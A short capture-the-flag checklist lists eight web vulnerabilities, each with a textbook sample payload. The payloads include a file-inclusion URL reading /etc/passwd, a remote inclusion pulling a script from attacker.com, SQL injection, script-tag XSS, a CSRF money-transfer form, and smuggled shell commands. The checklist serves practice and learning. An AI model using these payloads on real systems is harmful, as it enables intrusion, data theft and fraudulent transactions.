# CTF Checklist: From Easy to Harder Vulnerabilities

This CTF checklist provides guidelines to help you progress through various vulnerabilities, starting with easier ones and advancing to more challenging ones. Each vulnerability comes with sample payloads that you can use to exploit them. Remember, learning from challenges is the primary goal, so always try to understand the underlying concepts.

## 1. Directory Listing

Sample Payload:
```
No payload needed. Access a directory that should not be publicly accessible and check if the server returns a list of files.
```

## 2. File Inclusion

Sample Payload (Local File Inclusion):
```
http://example.com/page.php?file=/etc/passwd
```

Sample Payload (Remote File Inclusion):
```
http://example.com/page.php?file=http://attacker.com/malicious_script.php
```

## 3. SQL Injection

Sample Payload:
```
' OR 1=1 -- 
```

## 4. Cross-Site Scripting (XSS)

Sample Payload (Stored XSS):
```html
<script>alert("XSS Attack");</script>
```

Sample Payload (Reflected XSS):
```
http://example.com/search?q=<script>alert("XSS Attack");</script>
```

## 5. Cross-Site Request Forgery (CSRF)

Sample Payload:
```html
<form action="http://example.com/transfer" method="POST">
  <input type="hidden" name="amount" value="100">
  <input type="hidden" name="destination" value="attacker_account">
  <input type="submit" value="Click here to claim your reward!">
</form>
```

## 6. Command Injection

Sample Payload:
```
; ls -la
```

## 7. Server-Side Request Forgery (SSRF)

Sample Payload:
```
http://example.com/endpoint?url=http://internal_server/internal_resource
```

## 8. Remote Code Execution (RCE)

Sample Payload:
```
; echo "RCE Successful" > /tmp/rce.txt
```

---

Remember to always play fair, respect the CTF platform's rules, and seek knowledge from your experiences. Happy hacking and learning!